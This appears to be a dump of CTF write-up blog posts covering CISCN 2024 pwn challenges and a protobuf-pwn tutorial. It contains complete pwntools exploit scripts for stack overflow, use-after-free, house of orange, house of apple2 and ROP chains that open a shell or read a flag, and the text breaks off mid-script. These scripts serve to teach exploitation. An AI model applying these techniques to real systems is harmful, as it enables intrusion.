[{"content":"PWN gostack 题目简介 libc: 2.35\nexploit point: stack overflow\ngolang编写的一道栈题，有一个无限制的输入，通过gdb动调找出偏移量，覆盖ret地址为main_main2，开启一个bash\nexp 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 from pwn import * binary_path = \u0026#39;./gostack\u0026#39; libc_path = \u0026#34;/lib/x86_64-linux-gnu/libc.so.6\u0026#34; context(arch=\u0026#34;amd64\u0026#34;,os=\u0026#34;linux\u0026#34;,log_level=\u0026#34;debug\u0026#34;) elf = ELF(binary_path) libc = ELF(libc_path) p=remote(\u0026#39;8.147.128.251\u0026#39;,30914) leak_addr = lambda name,addr: log.success(f\u0026#39;{name}-----\u0026gt;\u0026#39;+hex(addr)) main_arena_offset = libc.symbols[\u0026#34;__malloc_hook\u0026#34;] + 0x10 #global_max_fast_offset = 0x3c67f8 #free_hook_offset = libc.symbols[\u0026#34;__free_hook\u0026#34;] def debug(): gdb.attach(p) pause() def pwn(): payload = b\u0026#34;a\u0026#34;*256 + p64(0X4a05a0) + p64(101) payload = payload.ljust(464,b\u0026#34;a\u0026#34;) + p64(0X4a05a0) #print(payload) p.sendline(payload) p.interactive() if __name__ == \u0026#34;__main__\u0026#34;: pwn() orange_cat_diary 题目简介 libc: 2.23\nexploit point: UAF\n传统菜单堆题，libc2.23，UAF漏洞，有一次free和一次show，我们又要泄露libc又要打一次UAF，明显一次free是不够的，所以选择打一次house of orange（呼应上了），然后UAF打malloc_hook\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 from pwn import * binary_path = \u0026#39;./orange_cat_diary\u0026#39; libc_path = \u0026#34;./libc.so.6\u0026#34; context(arch=\u0026#34;amd64\u0026#34;,os=\u0026#34;linux\u0026#34;,log_level=\u0026#34;debug\u0026#34;) elf = ELF(binary_path) libc = ELF(libc_path) argv = f\u0026#39;\u0026#39; #p=process(argv=[binary_path, argv]) p=remote(\u0026#39;8.147.129.254\u0026#39;,12519) leak_addr = lambda name,addr: log.success(f\u0026#39;{name}-----\u0026gt;\u0026#39;+hex(addr)) main_arena_offset = libc.symbols[\u0026#34;__malloc_hook\u0026#34;] + 0x10 def debug(): gdb.attach(p) pause() def cmd(idx): p.sendlineafter(b\u0026#34;Please input your choice:\u0026#34;,str(idx)) def add(size,content): cmd(1) p.sendlineafter(b\u0026#34;Please input the length of the diary content:\u0026#34;,str(size)) p.sendlineafter(b\u0026#34;Please enter the diary content:\u0026#34;,content) def show(): cmd(2) def free(): cmd(3) def edit(size,content): cmd(4) p.sendlineafter(b\u0026#34;Please input the length of the diary content:\u0026#34;,str(size)) p.sendlineafter(b\u0026#34;Please enter the diary content:\\n\u0026#34;,content) def welcome(name): p.sendlineafter(b\u0026#34;Hello, I\u0026#39;m delighted to meet you. Please tell me your name.\\n\u0026#34;,name) def pwn(): #debug() welcome(b\u0026#34;y4ng\u0026#34;) add(0x18,b\u0026#34;aaaa\u0026#34;) edit(0x20,b\u0026#34;b\u0026#34;*0x18+b\u0026#34;\\xE1\\x0f\\x00\\x00\\x00\\x00\\x00\\x00\u0026#34;) add(0x1000,b\u0026#34;y4ng\u0026#34;) add(0x60,b\u0026#34;\u0026#34;) show() libc_addr = u64(p.recv(6).ljust(8,b\u0026#34;\\x00\u0026#34;))-0x3c510a leak_addr(\u0026#34;libc_addr\u0026#34;,libc_addr ) malloc_hook = libc_addr + libc.sym[\u0026#34;__malloc_hook\u0026#34;]-0x23 one = libc_addr+0xf03a4 free() edit(0x10,p64(malloc_hook)) add(0x60,b\u0026#34;a\u0026#34;) add(0x60,b\u0026#34;a\u0026#34;*0x13+p64(one)) cmd(1) p.sendlineafter(b\u0026#34;Please input the length of the diary content:\u0026#34;,str(0x20)) p.interactive() if __name__ == \u0026#34;__main__\u0026#34;: pwn() ezheap 怎么是用seccomp开的沙箱啊，下次记得用prctl才不会有这么多释放的heap内存，推荐文章seccomp沙箱\n题目简介 libc: 2.35\nexploit point: heap overflow\n借助空间中现存的heap，泄露出libc和heap地址，然后打house of apple2\nexp 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 from pwn import * binary_path = \u0026#39;./EzHeap\u0026#39; libc_path = \u0026#34;./libc.so.6\u0026#34; context(arch=\u0026#34;amd64\u0026#34;,os=\u0026#34;linux\u0026#34;,log_level=\u0026#34;debug\u0026#34;) elf = ELF(binary_path) libc = ELF(libc_path) argv = f\u0026#39;\u0026#39; p=process(argv=[binary_path, argv]) #p=remote(\u0026#39;8.147.129.121\u0026#39;,15268) leak_addr = lambda name,addr: log.success(f\u0026#39;{name}-----\u0026gt;\u0026#39;+hex(addr)) main_arena_offset = libc.symbols[\u0026#34;__malloc_hook\u0026#34;] + 0x10 #global_max_fast_offset = 0x3c67f8 #free_hook_offset = libc.symbols[\u0026#34;__free_hook\u0026#34;] def debug(): gdb.attach(p,\u0026#34;b _IO_wdoallocbuf\u0026#34;) pause() def cmd(idx): p.sendlineafter(b\u0026#34;choice \u0026gt;\u0026gt; \u0026#34;,str(idx)) def add(size,content): cmd(1) p.sendlineafter(b\u0026#34;size:\u0026#34;,str(size)) p.sendlineafter(b\u0026#34;content:\u0026#34;,content) def free(idx_): cmd(2) p.sendlineafter(b\u0026#34;idx\u0026#34;,str(idx_)) def edit(idx,size,content): cmd(3) p.sendlineafter(b\u0026#34;idx\u0026#34;,str(idx)) p.sendlineafter(b\u0026#34;size:\u0026#34;,str(size)) p.sendlineafter(b\u0026#34;content:\u0026#34;,content) def show(idx): cmd(4) p.sendlineafter(b\u0026#34;idx\u0026#34;,str(idx)) p.recvuntil(b\u0026#34;content:\u0026#34;) def pwn(): add(0x50,b\u0026#34;y4ng\u0026#34;) #0 add(0x50,b\u0026#34;y4ng\u0026#34;) #1 edit(1,0x60,b\u0026#34;a\u0026#34;*8*12) show(1) p.recvuntil(b\u0026#34;a\u0026#34;*8*12) libc_addr = u64(p.recv(6).ljust(8,b\u0026#34;\\x00\u0026#34;)) - 0x21ace0 leak_addr(\u0026#34;libc_addr\u0026#34;,libc_addr) edit(1,0x60,b\u0026#34;a\u0026#34;*8*11+p64(0x90)) for i in range(7): add(0x30,b\u0026#34;y4ng\u0026#34;) #2-8 add(0x30,b\u0026#34;y4ng\u0026#34;) #9 add(0x30,b\u0026#34;y4ng\u0026#34;) #10 edit(10,0x41,b\u0026#34;a\u0026#34;*8*8+b\u0026#34;a\u0026#34;) show(10) p.recvuntil(b\u0026#34;a\u0026#34;*8*8) heap_base = u64(p.recv(6).ljust(8,b\u0026#34;\\x00\u0026#34;))- 0x61 edit(10,0x48,b\u0026#34;a\u0026#34;*8*6+p64(0)+p64(0xf1)+p64(heap_base)) heap_base += 0x1590 #debug() pop_rdi_ret = libc_addr + 0x000000000002a3e5 pop_rsi_ret = libc_addr + 0x000000000002be51 pop_rsi_r15_ret = libc_addr + 0x000000000002a3e3 pop_rdx_r12_ret = libc_addr + 0x000000000011f2e7 pop_rax_ret = libc_addr + 0x0000000000045eb0 magic_gadget = libc_addr + 26 + 0x16a050 \u0026#39;\u0026#39;\u0026#39; mov rbp,QWORD PTR [rdi+0x48] mov rax,QWORD PTR [rbp+0x18] lea r13,[rbp+0x10] mov DWORD PTR [rbp+0x10],0x0 mov rdi,r13 call QWORD PTR [rax+0x28] \u0026#39;\u0026#39;\u0026#39; leave_ret = libc_addr + 0x000000000004da83 syscall_ret = libc_addr + libc.sym[\u0026#39;read\u0026#39;] + 0x10 ret = libc_addr + 0x0000000000029139 fake_IO_addr = heap_base + 0x180 leak_addr(\u0026#34;fake_IO_addr\u0026#34;,fake_IO_addr) rop_address = fake_IO_addr + 0xe0 + 0xe8 + 0x70 orw_rop = b\u0026#39;./flag\\x00\\x00\u0026#39; orw_rop += p64(pop_rsi_r15_ret) + p64(0) + p64(fake_IO_addr - 0x10) orw_rop += p64(pop_rdi_ret) + p64(rop_address) #orw_rop += p64(pop_rsi_ret) + p64(0) orw_rop += p64(pop_rax_ret) + p64(2) orw_rop += p64(syscall_ret) orw_rop += p64(pop_rdi_ret) + p64(3) orw_rop += p64(pop_rsi_ret) + p64(rop_address + 0x100) orw_rop += p64(pop_rdx_r12_ret) + p64(0x50) + p64(0) orw_rop += p64(libc.sym[\u0026#39;read\u0026#39;]+libc_addr) orw_rop += p64(pop_rdi_ret) + p64(1) orw_rop += p64(pop_rsi_ret) + p64(rop_address + 0x100) orw_rop += p64(pop_rdx_r12_ret) + p64(0x50) + p64(0) orw_rop += p64(libc.sym[\u0026#39;write\u0026#39;]+libc_addr) payload = p64(0) + p64(leave_ret) + p64(0) + p64(libc.sym[\u0026#39;_IO_list_all\u0026#39;] - 0x20 + libc_addr) payload = payload.ljust(0x38, b\u0026#39;\\x00\u0026#39;) + p64(rop_address) payload = payload.ljust(0x90, b\u0026#39;\\x00\u0026#39;) + p64(fake_IO_addr + 0xe0) payload = payload.ljust(0xc8, b\u0026#39;\\x00\u0026#39;) + p64(libc.sym[\u0026#39;_IO_wfile_jumps\u0026#39;]+libc_addr) payload = payload.ljust(0xd0 + 0xe0, b\u0026#39;\\x00\u0026#39;) + p64(fake_IO_addr + 0xe0 + 0xe8) payload = payload.ljust(0xd0 + 0xe8 + 0x68, b\u0026#39;\\x00\u0026#39;) + p64(magic_gadget) payload += orw_rop leak_addr(\u0026#34;heap_base\u0026#34;,heap_base) add(0x100,b\u0026#34;a\u0026#34;) # 11 add(0x450,b\u0026#34;y4ng\u0026#34;) # 12 add(0x450,b\u0026#34;y4ng\u0026#34;) # 13 add(0x440,b\u0026#34;y4ng\u0026#34;) # 14 add(0x440,b\u0026#34;y4ng\u0026#34;) # 15 free(12) add(0x500,b\u0026#34;y4ng\u0026#34;) # 12 free(14) p1 = b\u0026#34;a\u0026#34;*0x100+p64(0)+p64(0x461)+payload edit(11,len(p1),p1) add(0x500,b\u0026#34;y4ng\u0026#34;) add(0x440,b\u0026#34;y4ng\u0026#34;) # 15 cmd(5) p.interactive() if __name__ == \u0026#34;__main__\u0026#34;: pwn() crypto 工业信息 一道可信计算题，字太多了让GPT帮我读文档，根据他给的代码修改record.list和函数\nrecord.list 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 { \u0026#34;type\u0026#34;: \u0026#34;MAC_LABEL\u0026#34;, \u0026#34;subtype\u0026#34;: \u0026#34;RECORD\u0026#34; } { \u0026#34;name\u0026#34;: \u0026#34;name\u0026#34;, \u0026#34;isleveladjust\u0026#34;: 0, \u0026#34;isselfdefine\u0026#34;: 1, \u0026#34;class\u0026#34;: \u0026#34;\u0026#34;, \u0026#34;level_fix\u0026#34;: 1, \u0026#34;level_adjust\u0026#34;: 0 } { \u0026#34;name\u0026#34;: \u0026#34;ID\u0026#34;, \u0026#34;isleveladjust\u0026#34;: 0, \u0026#34;isselfdefine\u0026#34;: 1, \u0026#34;class\u0026#34;: \u0026#34;\u0026#34;, \u0026#34;level_fix\u0026#34;: 1, \u0026#34;level_adjust\u0026#34;: 0 } { \u0026#34;name\u0026#34;: \u0026#34;department\u0026#34;, \u0026#34;isleveladjust\u0026#34;: 0, \u0026#34;isselfdefine\u0026#34;: 1, \u0026#34;class\u0026#34;: \u0026#34;\u0026#34;, \u0026#34;level_fix\u0026#34;: 1, \u0026#34;level_adjust\u0026#34;: 0 } { \u0026#34;name\u0026#34;: \u0026#34;position\u0026#34;, \u0026#34;isleveladjust\u0026#34;: 0, \u0026#34;isselfdefine\u0026#34;: 1, \u0026#34;class\u0026#34;: \u0026#34;\u0026#34;, \u0026#34;level_fix\u0026#34;: 1, \u0026#34;level_adjust\u0026#34;: 0 } { \u0026#34;name\u0026#34;: \u0026#34;YOF\u0026#34;, \u0026#34;isleveladjust\u0026#34;: 0, \u0026#34;isselfdefine\u0026#34;: 1, \u0026#34;class\u0026#34;: \u0026#34;\u0026#34;, \u0026#34;level_fix\u0026#34;: 1, \u0026#34;level_adjust\u0026#34;: 0 } { \u0026#34;name\u0026#34;: \u0026#34;salary\u0026#34;, \u0026#34;isleveladjust\u0026#34;: 1, \u0026#34;isselfdefine\u0026#34;: 1, \u0026#34;class\u0026#34;: \u0026#34;F\u0026#34;, \u0026#34;level_fix\u0026#34;: 0, \u0026#34;level_adjust\u0026#34;: 0 } { \u0026#34;name\u0026#34;: \u0026#34;cell\u0026#34;, \u0026#34;isleveladjust\u0026#34;: 1, \u0026#34;isselfdefine\u0026#34;: 0, \u0026#34;class\u0026#34;: \u0026#34;\u0026#34;, \u0026#34;level_fix\u0026#34;: 0, \u0026#34;level_adjust\u0026#34;: -1 } { \u0026#34;name\u0026#34;: \u0026#34;email\u0026#34;, \u0026#34;isleveladjust\u0026#34;: 1, \u0026#34;isselfdefine\u0026#34;: 0, \u0026#34;class\u0026#34;: \u0026#34;\u0026#34;, \u0026#34;level_fix\u0026#34;: 0, \u0026#34;level_adjust\u0026#34;: -2 } fuction 1 2 3 4 5 6 7 // add except rule check here if (strcmp(record_name, \u0026#34;salary\u0026#34;) == 0) { // 判断是否是本人查询 if (strcmp(read_user, record_user) == 0) { return 1; // 允许访问 } } ","permalink":"https://www.y4ng.cn/posts/writeups/ciscn_2024/","summary":"PWN gostack 题目简介 libc: 2.35\nexploit point: stack overflow\ngolang编写的一道栈题，有一个无限制的输入，通过gdb动调找出偏移量，覆盖ret地址为main_main2，开启一个bash\nexp 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 from pwn import * binary_path = \u0026#39;./gostack\u0026#39; libc_path = \u0026#34;/lib/x86_64-linux-gnu/libc.so.6\u0026#34; context(arch=\u0026#34;amd64\u0026#34;,os=\u0026#34;linux\u0026#34;,log_level=\u0026#34;debug\u0026#34;) elf = ELF(binary_path) libc = ELF(libc_path) p=remote(\u0026#39;8.147.128.251\u0026#39;,30914) leak_addr = lambda name,addr: log.success(f\u0026#39;{name}-----\u0026gt;\u0026#39;+hex(addr)) main_arena_offset = libc.symbols[\u0026#34;__malloc_hook\u0026#34;] + 0x10 #global_max_fast_offset = 0x3c67f8 #free_hook_offset = libc.symbols[\u0026#34;__free_hook\u0026#34;] def debug(): gdb.","title":"CISCN_2024"},{"content":" Protobuf pwn Introduction Protocol Buffers are language-neutral, platform-neutral extensible mechanisms for serializing structured data.\ngoogle发明的一个数据格式，平台兼容性和语言兼容性都非常好，能够将数据结构体转换成bytes形式发送，也能将bytes流反序列化为结构体（可是👨选择json\nInstall protobuf on Ubuntu 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 # install protobuf git clone -b v3.21.0 https://github.com/protocolbuffers/protobuf.git # 大于3.20都ok sudo apt-get install autoconf automake libtool curl make g++ unzip # 一些依赖 sudo ./autogen.sh #生成配置脚本 sudo ./configure # 可选 --prefix=path ，默认路径为/usr/local/ make -j`nproc` sudo make install sudo ldconfig # refresh shared library cache which protoc # find the location protoc --version # check # install protobuf-c git clone https://github.com/protobuf-c/protobuf-c.git ./autogen.sh \u0026amp;\u0026amp; ./configure make -j8 # 开nproc给我卡死了... sudo make install 👨的垃圾虚拟机编译安装是真的一坨💩\nTo reverse protobuf 先创建一个xxx.proto文件\n1 2 3 4 5 6 7 8 9 syntax=\u0026#34;proto3\u0026#34;; //proto version 2 or 3 message devicemsg{ bytes whatcon = 1; sint64 whattodo = 2; sint64 whatidx = 3; sint64 whatsize = 4; uint32 whatsthis = 5; } C语言下分析 输入以下命令\n1 protoc --c_out=./ devicemsg.proto \u0026ndash;c_out=./ : 将.proto文件以C语言格式输出在当前目录下\n分析.c文件\n序列化和反序列化函数 1 2 3 4 5 6 7 8 9 size_t devicemsg__pack (const Devicemsg *message, uint8_t *out) //序列化 { assert(message-\u0026gt;base.descriptor == \u0026amp;devicemsg__descriptor); return protobuf_c_message_pack ((const ProtobufCMessage*)message, out); } Devicemsg *devicemsg__unpack(ProtobufCAllocator *allocator, size_t len, const uint8_t *data) // 反序列化 { return (Devicemsg *)protobuf_c_message_unpack(\u0026amp;devicemsg__descriptor,allocator, len, data); } 结构体信息 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 static const ProtobufCFieldDescriptor devicemsg__field_descriptors[5] = { { \u0026#34;whatcon\u0026#34;, 1, PROTOBUF_C_LABEL_NONE, PROTOBUF_C_TYPE_BYTES, 0, /* quantifier_offset */ offsetof(Devicemsg, whatcon), NULL, NULL, 0, /* flags */ 0,NULL,NULL /* reserved1,reserved2, etc */ }, { \u0026#34;whattodo\u0026#34;, 2, PROTOBUF_C_LABEL_NONE, PROTOBUF_C_TYPE_SINT64, 0, /* quantifier_offset */ offsetof(Devicemsg, whattodo), NULL, NULL, 0, /* flags */ 0,NULL,NULL /* reserved1,reserved2, etc */ }, { \u0026#34;whatidx\u0026#34;, 3, PROTOBUF_C_LABEL_NONE, PROTOBUF_C_TYPE_SINT64, 0, /* quantifier_offset */ offsetof(Devicemsg, whatidx), NULL, NULL, 0, /* flags */ 0,NULL,NULL /* reserved1,reserved2, etc */ }, { \u0026#34;whatsize\u0026#34;, 4, PROTOBUF_C_LABEL_NONE, PROTOBUF_C_TYPE_SINT64, 0, /* quantifier_offset */ offsetof(Devicemsg, whatsize), NULL, NULL, 0, /* flags */ 0,NULL,NULL /* reserved1,reserved2, etc */ }, { \u0026#34;whatsthis\u0026#34;, 5, PROTOBUF_C_LABEL_NONE, PROTOBUF_C_TYPE_UINT32, 0, /* quantifier_offset */ offsetof(Devicemsg, whatsthis), NULL, NULL, 0, /* flags */ 0,NULL,NULL /* reserved1,reserved2, etc */ }, }; static const unsigned devicemsg__field_indices_by_name[] = { 0, /* field[0] = whatcon */ 2, /* field[2] = whatidx */ 3, /* field[3] = whatsize */ 4, /* field[4] = whatsthis */ 1, /* field[1] = whattodo */ }; static const ProtobufCIntRange devicemsg__number_ranges[1 + 1] = { { 1, 0 }, { 0, 5 } }; const ProtobufCMessageDescriptor devicemsg__descriptor = { PROTOBUF_C__MESSAGE_DESCRIPTOR_MAGIC, \u0026#34;devicemsg\u0026#34;, \u0026#34;Devicemsg\u0026#34;, \u0026#34;Devicemsg\u0026#34;, \u0026#34;\u0026#34;, sizeof(Devicemsg), 5, devicemsg__field_descriptors, devicemsg__field_indices_by_name, 1, devicemsg__number_ranges, (ProtobufCMessageInit) devicemsg__init, NULL,NULL,NULL /* reserved[123] */ }; 可以看到每一个结构体中，字段信息分别是成员名称，序号索引，标签，数据类型，限定符字段偏移（俺也没弄懂，偏移量（和结构体首地址的）\u0026hellip;\n类型表 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 typedef enum { PROTOBUF_C_TYPE_INT32, /**\u0026lt; int32 */ PROTOBUF_C_TYPE_SINT32, /**\u0026lt; signed int32 */ PROTOBUF_C_TYPE_SFIXED32, /**\u0026lt; signed int32 (4 bytes) */ PROTOBUF_C_TYPE_INT64, /**\u0026lt; int64 */ PROTOBUF_C_TYPE_SINT64, /**\u0026lt; signed int64 */ PROTOBUF_C_TYPE_SFIXED64, /**\u0026lt; signed int64 (8 bytes) */ PROTOBUF_C_TYPE_UINT32, /**\u0026lt; unsigned int32 */ PROTOBUF_C_TYPE_FIXED32, /**\u0026lt; unsigned int32 (4 bytes) */ PROTOBUF_C_TYPE_UINT64, /**\u0026lt; unsigned int64 */ PROTOBUF_C_TYPE_FIXED64, /**\u0026lt; unsigned int64 (8 bytes) */ PROTOBUF_C_TYPE_FLOAT, /**\u0026lt; float */ PROTOBUF_C_TYPE_DOUBLE, /**\u0026lt; double */ PROTOBUF_C_TYPE_BOOL, /**\u0026lt; boolean */ PROTOBUF_C_TYPE_ENUM, /**\u0026lt; enumerated type */ PROTOBUF_C_TYPE_STRING, /**\u0026lt; UTF-8 or ASCII string */ PROTOBUF_C_TYPE_BYTES, /**\u0026lt; arbitrary byte sequence */ PROTOBUF_C_TYPE_MESSAGE, /**\u0026lt; nested message */ } ProtobufCType; 从0到0x10\n描述符结构体 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 /** * Describes a message. */ struct ProtobufCMessageDescriptor { /** Magic value checked to ensure that the API is used correctly. */ uint32_t\tmagic; /** The qualified name (e.g., \u0026#34;namespace.Type\u0026#34;). */ const char\t*name; /** The unqualified name as given in the .proto file (e.g., \u0026#34;Type\u0026#34;). */ const char\t*short_name; /** Identifier used in generated C code. */ const char\t*c_name; /** The dot-separated namespace. */ const char\t*package_name; /** * Size in bytes of the C structure representing an instance of this * type of message. */ size_t\tsizeof_message; /** Number of elements in `fields`. */ unsigned\tn_fields; /** Field descriptors, sorted by tag number. */ const ProtobufCFieldDescriptor\t*fields; /** Used for looking up fields by name. */ const unsigned\t*fields_sorted_by_name; /** Number of elements in `field_ranges`. */ unsigned\tn_field_ranges; /** Used for looking up fields by id. */ const ProtobufCIntRange\t*field_ranges; /** Message initialisation function. */ ProtobufCMessageInit\tmessage_init; /** Reserved for future use. */ void\t*reserved1; /** Reserved for future use. */ void\t*reserved2; /** Reserved for future use. */ void\t*reserved3; }; important:\nmagic，一般为0x28AAEEF9 n_fields，关系到原始的message结构内有几条记录、 fields，这个指向message内所有记录类型组成的一个数组，可以借此逆向分析message结构。 field结构体 这个结构体就是上文说的储存名称，偏移量的，也是IDA里面看到的\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 struct ProtobufCFieldDescriptor { /** Name of the field as given in the .proto file. */ const char\t*name; /** Tag value of the field as given in the .proto file. */ uint32_t\tid; /** Whether the field is `REQUIRED`, `OPTIONAL`, or `REPEATED`. */ ProtobufCLabel\tlabel; /** The type of the field. */ ProtobufCType\ttype; /** * The offset in bytes of the message\u0026#39;s C structure\u0026#39;s quantifier field * (the `has_MEMBER` field for optional members or the `n_MEMBER` field * for repeated members or the case enum for oneofs). */ unsigned\tquantifier_offset; /** * The offset in bytes into the message\u0026#39;s C structure for the member * itself. */ unsigned\toffset; /** * A type-specific descriptor. * * If `type` is `PROTOBUF_C_TYPE_ENUM`, then `descriptor` points to the * corresponding `ProtobufCEnumDescriptor`. * * If `type` is `PROTOBUF_C_TYPE_MESSAGE`, then `descriptor` points to * the corresponding `ProtobufCMessageDescriptor`. * * Otherwise this field is NULL. */ const void\t*descriptor; /* for MESSAGE and ENUM types */ /** The default value for this field, if defined. May be NULL. */ const void\t*default_value; /** * A flag word. Zero or more of the bits defined in the * `ProtobufCFieldFlag` enum may be set. */ uint32_t\tflags; /** Reserved for future use. */ unsigned\treserved_flags; /** Reserved for future use. */ void\t*reserved2; /** Reserved for future use. */ void\t*reserved3; }; 具体信息可看protobuf-c\nUse protobuf with python 输入命令\n1 protoc --python_out=./ devicemsg.proto 生成devicemsg_pb2.py\n模板 1 2 3 4 5 6 7 8 import devicemsg_pb2 data = devicemsg_pb2.devicemsg() # 方法名称跟随.proto中结构体名称变化 data.whattodo = todo data.whatcon = content data.whatidx = idx data.whatsize = size data.whatsthis = this data.SerializeToString() # 转换成bytes CISCN 2024 ezbuf 👨做这题的时候甚至不知道protobuf是什么\n恢复结构体 关键结构体在这，1代表序号1，3代表label，0XF代表类型，查表即可\n根据以上字段恢复出protobuf结构体\n1 2 3 4 5 6 7 8 9 syntax=\u0026#34;proto3\u0026#34;; message devicemsg{ bytes whatcon = 1; sint64 whattodo = 2; sint64 whatidx = 3; sint64 whatsize = 4; uint32 whatsthis = 5; } 代码分析 入口 偏移和.data.rel.ro中的第五个字段正好对应上,除了v4+32\n从a2-a6分别是，content todo idx size this\n菜单 函数0是什么都不干，纯解析我们发包的数据，但是会根据数据长度分配对应堆，如func0(str) \u0026ndash;\u0026gt; malloc(len(str))\n函数1是申请0x30的chunk，然后copy数据进去\n函数2是free，里面有UAF\n函数3是打印我们申请chunk的数据，超过两次关闭标准输出和错误\n漏洞利用 通过遗留的unsorted bin的bk来得到libc的地址，然后通过释放第一个0x40大小的chunk进入tcache，打印出来heap地址，UAF修改tcache的fd\n申请到tcache_perthread_struct,将environ地址添加到size为0x40的tcache堆块上，泄露出stack地址\n修改rsp指针，在栈上打ORW\nexp 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 from pwn import * import devicemsg_pb2 binary_path = \u0026#39;./pwn\u0026#39; libc_path = \u0026#34;./libc.so.6\u0026#34; context(arch=\u0026#34;amd64\u0026#34;,os=\u0026#34;linux\u0026#34;,log_level=\u0026#34;debug\u0026#34;,terminal = [\u0026#39;tmux\u0026#39;,\u0026#39;splitw\u0026#39;,\u0026#39;-h\u0026#39;]) elf = ELF(binary_path) libc = ELF(libc_path) argv = f\u0026#39;\u0026#39; p=process(argv=[binary_path, argv]) #p=remote(\u0026#39;0.0.0.0\u0026#39;,10002) leak_addr = lambda name,addr: log.success(f\u0026#39;{name}-----\u0026gt;\u0026#39;+hex(addr)) main_arena_offset = libc.symbols[\u0026#34;__malloc_hook\u0026#34;] + 0x10 #global_max_fast_offset = 0x3c67f8 #free_hook_offset = libc.symbols[\u0026#34;__free_hook\u0026#34;] data = devicemsg_pb2.devicemsg() def debug(): gdb.attach(p) pause() def add(idx,content): data.whattodo = 1 data.whatcon = content data.whatidx = idx data.whatsize=0 data.whatsthis=0 p.sendafter(b\u0026#34;WHAT DO YOU WANT?\u0026#34;,data.SerializeToString()) def show(idx): data.whatcon=b\u0026#34;0\u0026#34; data.whattodo=3 data.whatidx=idx data.whatsize=0x20 data.whatsthis=0x20 p.sendafter(\u0026#34;WHAT DO YOU WANT?\u0026#34;,data.SerializeToString()) def dele(idx): data.whatcon=b\u0026#34;B\u0026#34;*0xc0 data.whattodo=2 data.whatidx=idx data.whatsize=0x20 data.whatsthis=0x20 p.sendafter(\u0026#34;WHAT DO YOU WANT?\u0026#34;,data.SerializeToString()) def clean(mem): data.whatcon=mem data.whattodo=0 data.whatidx=0 data.whatsize=0x20 data.whatsthis=0x20 p.sendafter(\u0026#34;WHAT DO YOU WANT?\u0026#34;,data.SerializeToString()) def pwn(): for i in range(9): add(i,b\u0026#34;y4ngy4ng\u0026#34;) show(0) p.recvuntil(b\u0026#34;y4ngy4ng\u0026#34;) libc_addr= u64(p.recv(6).ljust(0x8,b\u0026#34;\\x00\u0026#34;)) - 0x21ace0 leak_addr(\u0026#34;libc_addr\u0026#34;,libc_addr) dele(0) show(0) p.recvuntil(\u0026#34;Content:\u0026#34;) heap_base = (u64(p.recv(5).ljust(0x8,b\u0026#34;\\x00\u0026#34;)) \u0026lt;\u0026lt; 12) - 0x2000 leak_addr(\u0026#34;heap_base\u0026#34;,heap_base) for i in range(6): dele(i+1) dele(7) dele(8) dele(7) for i in range(7): add(i,b\u0026#34;A\u0026#34;*0x8) environ = libc.sym[\u0026#39;environ\u0026#39;] + libc_addr stdout = libc.sym[\u0026#39;_IO_2_1_stdout_\u0026#39;] + libc_addr add(7,p64((heap_base+0xf0) ^((heap_base+0x4e40)\u0026gt;\u0026gt;12))) add(8,b\u0026#34;AAAAAA\u0026#34;) add(8,b\u0026#34;A\u0026#34;) add(8,p64(0)+p64(heap_base+0x10)) #debug() clean((((p16(0)*2+p16(1)+p16(1)).ljust(0x10,b\u0026#34;\\x00\u0026#34;)+p16(1)+p16(1)).ljust(0x90,b\u0026#39;\\x00\u0026#39;)+p64(stdout)+p64(stdout)+p64(0)*5+p64(heap_base+0x10)).ljust(0xe0,b\u0026#34;\\x00\u0026#34;)) #raw_input() clean(p64(0xFBAD1800)+p64(0)*3+p64(environ)+p64(environ+8)) #debug() stack = u64(p.recvuntil(\u0026#34;\\x7f\u0026#34;)[-6:].ljust(0x8,b\u0026#34;\\x00\u0026#34;)) - 0x1a8 + 0x40 - 0x28 leak_addr(\u0026#34;stack\u0026#34;,stack) #raw_input() #debug() clean((((p16(0)*2+p16(0)+p16(0)+p16(1)).ljust(0x10,b\u0026#34;\\x00\u0026#34;)+p16(1)+p16(1)).ljust(0x90,b\u0026#39;\\x00\u0026#39;)+p64(0)+p64(0)+p64(stack)).ljust(0xa0,b\u0026#34;\\x00\u0026#34;)) #raw_input() pop_rdi = 0x000000000002a3e5 + libc_addr system = libc.sym[\u0026#39;system\u0026#39;] + libc_addr binsh = next(libc.search(b\u0026#34;/bin/sh\\x00\u0026#34;)) + 